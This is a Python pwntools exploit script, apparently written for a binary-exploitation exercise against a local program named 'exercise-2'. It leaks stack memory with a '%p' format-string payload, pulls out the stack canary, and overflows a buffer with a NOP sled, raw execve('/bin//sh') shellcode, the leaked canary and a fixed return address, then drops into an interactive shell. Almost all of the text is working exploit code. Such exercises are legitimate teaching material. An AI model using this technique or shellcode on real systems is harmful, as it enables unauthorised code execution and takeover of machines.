#!/usr/bin/python3

from pwn import *
import sys
from termcolor import colored

context.arch='amd64'
context.os='linux'

show = False
rip = 0x0000000000401708


def generate_payload(canary):
    nop = asm('nop', arch="amd64")
    size = 56
    addr = struct.pack("<Q", 0x7fffffff9360)
    c = struct.pack("<Q", canary)
    print('canary %016x' % canary)
    s_code = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
    payload = nop*(size - len(s_code))+ s_code + c + (nop*8) + addr
    return payload

def print_recvline(p):
    if(show):
        print(p.recvline())
    else:
        p.recvline()

def menu(p, option):
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    print_recvline(p)
    p.sendline(option)

def create_user(p, name, phone):
    owner = p.recvline()
    print_recvline(p)
    p.sendline(name)
    print_recvline(p)
    p.sendline(phone)
    return owner

def create_user_pwn(p):
    owner = p.recvline()
    print_recvline(p)
    memory = parse_owner(owner)
    rip_a = search_rip(memory)
    canary = get_canary(memory, rip_a)
    payload = generate_payload(canary)
    p.sendline(payload)
    print_recvline(p)
    p.sendline('a')
    return owner


def parse_owner(owner):
    owner = owner.decode("utf-8")
    memory = owner.split('_')
    memory = memory[:-2]
    for i in range(len(memory)):
        if memory[i] == '(nil)':
            memory[i] = '0x0'
        memory[i] = int(memory[i], 16)
    return memory

def print_memory(memory, col, rip_a):
    for i in range(len(memory)):
        out = '0x%016x' % (memory[i])
        if i == rip_a:
            print(colored(out, 'red'), end = "\t")
        elif (i + 1) == rip_a:
            print(colored(out, 'yellow'), end = "\t")
        elif (i + 2) == rip_a:
            print(colored(out, 'white'), end = "\t")
        else:
            print(colored(out, 'green'), end = "\t")
        if ((i+1) % col) == 0:
            print('')

def search_rip(memory):
     for i in range(len(memory)):
         if memory[i] == rip:
             return i

def get_canary(memory, rip_a):
    return memory[rip_a - 2]

path_exec = './exercise-2';
e = ELF(path_exec)

p = process(path_exec)
print_recvline(p)
# input("Press Enter to continue...")
p.sendline('%p_'*31)
menu(p, '1')
# owner = create_user(p, 'A', 'a');
# memory = parse_owner(owner)
# rip_a = search_rip(memory)
# print("0x%016x" % (get_canary(memory, rip_a)))
# print_memory(memory, 2, rip_a)
create_user_pwn(p)
p.interactive()
